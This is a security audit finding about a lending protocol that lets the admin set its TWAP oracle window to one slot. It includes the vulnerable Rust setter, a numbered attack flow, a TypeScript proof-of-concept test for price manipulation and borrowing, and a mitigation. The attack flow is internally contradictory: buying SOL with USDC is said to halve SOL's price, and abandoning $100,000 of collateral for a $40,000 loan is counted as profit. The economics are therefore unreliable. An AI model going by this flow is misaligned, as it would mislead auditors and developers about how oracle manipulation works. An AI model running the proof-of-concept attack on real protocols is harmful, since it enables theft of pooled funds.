# F-002: TWAP Window Configurable to 1 Slot

**Severity:** Critical
**Protocol Type:** Oracle Integration (Pyth/Switchboard + Lending, Solana/Anchor)
**Invariant Violated:** CROSS-1 (Oracle Manipulation Cost > Profit)
**Date:** 2026

---

## Description

The lending protocol uses a TWAP (Time-Weighted Average Price) oracle for collateral valuation but allows the protocol admin to configure the TWAP window down to 1 slot (~400ms on Solana). With a 1-slot TWAP, an attacker can manipulate the oracle price via a single AMM swap, borrow against the manipulated collateral value, and let the price return to normal — extracting funds at zero risk.

This is the same attack pattern that caused:
- **Mango Markets** — $110M (October 2022)
- **Cream Finance** — $130M (October 2021)

## Impact

**Direct:** An attacker can borrow against artificially inflated collateral, extracting the borrowed amount as pure profit.

**Attack requires:** 
1. Flash loan or capital to manipulate AMM spot price
2. 1-slot TWAP window (or window shorter than manipulation cost amortization)

**Profit:** Up to the protocol's total available liquidity.

## Root Cause

```rust
// Vulnerable: admin can set TWAP window arbitrarily low
pub fn set_twap_window(ctx: Context<Admin>, window_slots: u64) -> Result<()> {
    ctx.accounts.oracle_config.twap_window = window_slots;
    Ok(())
}
```

No minimum TWAP window is enforced. The oracle's manipulation resistance depends entirely on the window duration — at 1 slot, TWAP ≈ spot price.

## Attack Flow

1. Attacker takes a flash loan of 1,000,000 USDC
2. Swaps USDC → SOL on the AMM, pushing SOL price from $100 to $50 (massive slippage)
3. **With 1-slot TWAP:** Oracle immediately reflects $50 SOL price
4. Attacker deposits 1,000 SOL as collateral (valued at $50/SOL = $50,000)
5. Attacker borrows $40,000 USDC (80% LTV at manipulated price)
6. Swaps remaining USDC → SOL on the AMM, restoring SOL price to $100
7. Attacker repays flash loan (~$10 fee)
8. Attacker walks away with $40,000 USDC, abandoning the 1,000 SOL collateral (worth $100,000 at true price but only $50,000 was borrowed)
9. **Profit: $40,000 - $10 = $39,990 (protocol loses $60,000)**

## Proof of Concept

```typescript
// poc_f002.ts
import * as anchor from "@coral-xyz/anchor";

describe("F-002: TWAP window to 1 slot", () => {
  it("enables atomic oracle manipulation", async () => {
    // 1. Set TWAP window to 1 slot
    await program.methods.setTwapWindow(new anchor.BN(1))
      .accounts({ admin: admin.publicKey, /* ... */ })
      .signers([admin])
      .rpc();

    const initialPrice = 100_000_000; // $100 with 6 decimals

    // 2. Manipulate AMM spot price
    await swapOnAMM(USDC_MINT, SOL_MINT, 1_000_000_000_000); // 1M USDC → SOL

    // 3. Verify TWAP immediately reflects manipulated price
    const twapAfter = await program.account.oracleConfig.fetch(oraclePDA);
    const manipulatedPrice = 50_000_000; // $50
    expect(twapAfter.twapPrice.toNumber()).to.be.closeTo(
      manipulatedPrice, 1000
    );

    // 4. Deposit SOL collateral at manipulated price
    await program.methods.depositCollateral(new anchor.BN(1_000_000_000)) // 1000 SOL
      .accounts({ user: attacker.publicKey, /* ... */ })
      .signers([attacker])
      .rpc();

    // 5. Borrow USDC at 80% LTV
    // Collateral value at manipulated price: 1000 SOL × $50 = $50,000
    // Max borrow: $50,000 × 80% = $40,000
    const attackerBalanceBefore = await getUSDCBalance(attacker.publicKey);
    
    await program.methods.borrow(new anchor.BN(40_000_000_000)) // $40,000 USDC
      .accounts({ user: attacker.publicKey, /* ... */ })
      .signers([attacker])
      .rpc();

    const attackerBalanceAfter = await getUSDCBalance(attacker.publicKey);
    
    // 6. Attacker profited
    const profit = attackerBalanceAfter - attackerBalanceBefore;
    expect(profit).to.be.greaterThan(39_000_000_000); // ~$39,000+
  });
});
```

## Recommended Mitigation

Enforce a minimum TWAP window that makes manipulation uneconomical:

```rust
const MIN_TWAP_SLOTS: u64 = 900; // ~6 minutes on Solana

pub fn set_twap_window(ctx: Context<Admin>, window_slots: u64) -> Result<()> {
    require!(
        window_slots >= MIN_TWAP_SLOTS,
        ErrorCode::TWAPWindowTooShort
    );
    ctx.accounts.oracle_config.twap_window = window_slots;
    Ok(())
}
```

At 900 slots (~6 min), manipulating the price requires sustaining the manipulated state for 6 minutes — which costs more in AMM fees and arbitrage than any borrow profit.

Additionally:
- Use **Pyth's confidence interval** to reject prices with excessive uncertainty during manipulation
- Implement a **circuit breaker** that freezes the protocol if spot/TWAP deviation exceeds a threshold (e.g., 10%)

## References

- Invariant CROSS-1 — Oracle Manipulation Cost > Profit
- Invariant ORA-2 — TWAP in convex interval `[min(old_TWAP, midpoint), max(old_TWAP, midpoint)]`
- Mango Markets Post-Mortem (October 2022)
- Cream Finance Post-Mortem (October 2021)
